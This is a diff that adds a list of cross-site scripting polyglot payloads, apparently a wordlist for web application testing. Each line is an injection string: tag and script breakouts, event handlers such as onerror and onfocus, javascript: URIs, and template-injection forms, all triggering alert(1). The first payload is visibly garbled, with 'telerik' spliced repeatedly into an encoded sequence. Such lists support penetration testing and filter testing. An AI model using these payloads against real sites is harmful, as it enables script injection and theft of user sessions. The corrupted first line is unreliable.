@@ -1,0 +1,22 @@
+# XSS - Polyglot Payloads
+# Context-independent payloads that work across multiple injection contexts
+# HTML, attribute, JS string, URL contexts
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik%%telerik0telerik8telerik0telerik7telerik
+"><img src=x onerror=alert(1)><"
+'"><img src=x onerror=alert(1)>
+';alert(1)//
+"-alert(1)-"
+'-alert(1)-'
+\'-alert(1)//
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+--></script><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+"onmouseover=alert(1)//
+" onfocus=alert(1) autofocus="
+' onfocus=alert(1) autofocus='
+"autofocus onfocus=alert(1)//
+<svg/onload=alert(1)>
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+#{alert(1)}
